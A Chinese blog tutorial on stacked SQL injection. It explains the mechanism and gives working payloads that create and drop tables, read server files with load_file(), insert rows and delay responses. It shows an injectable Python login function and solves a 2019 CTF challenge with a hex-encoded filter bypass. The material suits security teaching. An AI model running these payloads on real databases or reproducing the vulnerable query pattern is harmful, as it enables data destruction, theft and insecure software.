# 原创
：  【sql注入-堆叠注入】多语句执行、结合其他注入

# 【sql注入-堆叠注入】多语句执行、结合其他注入

**目录**

[堆叠注入](#extractvalue%28%29%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

[一、语法介绍](#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[二、漏洞示例](#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0)

[三、常见形式](#%C2%A0%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E5%BD%A2%E5%BC%8F)

[网络安全O](#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%8F%E5%9C%88%E5%AD%90)

---


## 堆叠注入

> 
<h3>一、语法介绍：</h3>
版本：
可以影响几乎所有的关系型数据库
<hr/>
原理：
将多条语句堆叠在一起进行查询，且可以执行多条SQL语句
语句之间以分号(;)隔开，其注入攻击就是利用此特点，在第二条语句中构造payload
<hr/>
优势：
联合查询union也可拼接语句（有局限性）
但是堆叠注入能注入任意语句
<hr/>
局限：
利用mysqli_multi_query()函数就支持多条sql语句同时执行
但实际情况中，PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行

mysqli_query()函数:
<pre><code>mysqli_query($connection, $query);

//$connection：表示与MySQL服务器的连接，可以通过mysqli_connect()函数进行创建。
//$query：表示要执行的SQL查询语句。</code></pre>

<hr/>
使用：
有注入点：即存在sql注入漏洞
未过滤：即未对";"号进行过滤
未禁用：即未禁止执行多条sql语句

**第一步：使用堆叠查询构造多条语句**
select * from users where id=1;create table test like users; 

<hr/>
**第二步：查看语句是否成功执行**
show tables;

<hr/>
**第三步：删除test，再查询**
select * from users where id=1;drop table test;
show tables;
(被成功执行了)

 <img alt="" height="270" src="https://img-blog.csdnimg.cn/63269b1a31e24328ac25dae66007576d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6buR6Imy5Zyw5bimKOW0m-i1tyk=,size_18,color_FFFFFF,t_70,g_se,x_16" width="769"/>

<hr/>
** 第四步：执行其它查询语句**
查数据库当前用户，版本
select * from user where id=1;select 1,user(),database();


**其他操作：**
加载文件
select * from user where id=1;select load_file('文件路径');
修改数据
select * from user where id=1;insert into user(username,password) values ('好好学习','123456');




---


---


---


---


---


> 
<h3>二、漏洞示例</h3>
代码示例：
<pre><code>def login(username, password):
    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
    # 执行查询并验证用户登录信息
    ...
</code></pre>

login函数接收一个用户名和密码作为参数，并构建了一个SQL查询语句。然而，它没有对输入进行任何验证或转义，直接将用户提供的输入拼接到查询字符串中
如恶意代码：
<pre>`';select sleep(10);--+`</pre>

查询语句将变成：
<pre><code>SELECT * FROM users WHERE username='';select sleep(10);--+' AND password='...'
</code></pre>

如果存在注入的代码被执行，那么会执行sleep(10)函数，延时10s


---


> 
<h3> 三、常见形式</h3>

举例之：“强网杯2019随便注”
已知：words表能回显内容，`1919810931114514` 表不能回显具体内容，select被过滤了
<pre>`1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#`</pre>
1、堆叠注入
';    开始堆叠
RENAME TABLE wordsTOwords1;   将名为words的表重命名为words1
RENAME TABLE 1919810931114514TOwords;  将名为1919810931114514的表重命名为words
ALTER TABLE wordsCHANGEflag id VARCHAR(100);   更改words表中名为flag的列的名称为id，并将其数据类型更改为VARCHAR(100)（最大长度为100个字符）
SHOW COLUMNS FROM words;   显示words表的所有列以及其属性和信息
#    注释掉代码的剩余部分

2、堆叠注入+select编码绕过
<pre>`;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`</pre>



---


---


## 网络安全O

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
